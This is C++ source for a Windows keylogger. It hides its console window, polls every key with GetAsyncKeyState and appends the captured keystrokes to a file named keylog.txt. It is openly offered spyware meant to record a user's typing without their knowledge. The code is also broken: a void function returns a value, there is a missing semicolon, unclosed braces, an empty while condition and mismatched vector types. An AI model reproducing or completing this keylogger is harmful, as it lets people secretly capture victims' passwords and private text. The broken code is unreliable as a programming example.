#include <iostream>
#include<vector>
#include <fstream>
#include <Windows.h>
#include <string>
#include <bits/stdc++.h>

using namespace std;
#define LOG_FILE "keylog.txt"

void saveData(string data) {
    fstream file;

    file.open(LOG_FILE, ios::app);

    file << data;

    file.close();
}

/**
 * Translates a special key code to its corresponding string representation.
 *
 * @param key the special key code to be translated
 *
 * @return the string representation of the special key code
 *
 * @throws None
 */
void translateSpecialKey(int key){
    string result{};
    switch(key){
        case VK_SPACE:
            result = " ";
            break;
        case VK_RETURN:
            result = "\n";
            break;
        case VK_BACK:
            result = '\b'
            break;
        case VK_TAB:
            result = "[TAB]";
            break;
        case VK_SHIFT:
            result = "[SHIFT]";
            break;
        case VK_CONTROL:
            result = "[CTRL]";
            break;
        case VK_MENU:
            result = "[ALT]";
            break;
        case VK_CAPITAL:
            result = "[CAPS_LOCK]";
            break;
        default:
            break;
    return result;
}

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    vector <string> specialKeys = {VK_BACK, VK_TAB, VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL, VK_RETURN, VK_SPACE};
   

    while () {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8001) {
                if (find(specialKeys.begin(), specialKeys.end(), i) != specialKeys.end()) {
                    saveData(translateSpecialKey(i));
                } else {
                    saveData(char(i));
                }
            }
    
}